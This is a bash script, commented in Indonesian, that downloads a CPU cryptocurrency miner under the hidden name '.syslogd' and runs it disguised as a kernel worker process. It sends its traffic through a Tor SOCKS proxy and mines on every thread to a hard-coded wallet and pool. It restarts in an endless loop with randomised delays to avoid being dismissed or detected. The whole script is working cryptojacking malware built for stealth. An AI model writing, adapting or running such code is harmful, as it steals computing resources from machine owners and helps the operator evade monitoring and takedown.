#!/bin/bash
set -e

# ====[ Konfigurasi User ]====
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
BIN_NAME=".syslogd"
PROCESS_NAME="[kworker/u8:3-events]"
LOG_FILE=".xlog"
SOCKS_HOST="127.0.0.1"
SOCKS_PORT="9050"
DELAY_MIN=5
DELAY_MAX=15

# ====[ Install Dependensi ]====
echo "[INFO] Memasang dependensi..."
apt update -y && apt install -y wget tar proxychains

# ====[ Setup ProxyChains Config Lokal ]====
PROXYCHAINS_CONF="./proxychains.conf"
cat > "$PROXYCHAINS_CONF" <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $SOCKS_HOST $SOCKS_PORT
EOF

# ====[ Download Miner jika belum ada ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh miner..."
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f cpuminer-opt-linux.tar.gz
fi

# ====[ Fungsi Delay Random (Anti-Pattern) ]====
random_delay() {
    DELAY=$(( RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN ))
    echo "[INFO] Delay acak selama $DELAY detik..."
    sleep $DELAY
}

# ====[ Mulai Loop Mining Anti-Dismiss ]====
echo "[INFO] Menjalankan miner melalui SOCKS5 proxy ($SOCKS_HOST:$SOCKS_PORT)..."
while true; do
    echo "[INFO] $(date) :: Memulai mining..." >> "$LOG_FILE"

    proxychains -f "$PROXYCHAINS_CONF"     bash -c "exec -a \"$PROCESS_NAME\" ./$BIN_NAME -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS" >> "$LOG_FILE" 2>&1 || true

    echo "[WARN] Miner berhenti. Reinitializing..." >> "$LOG_FILE"
    random_delay
done
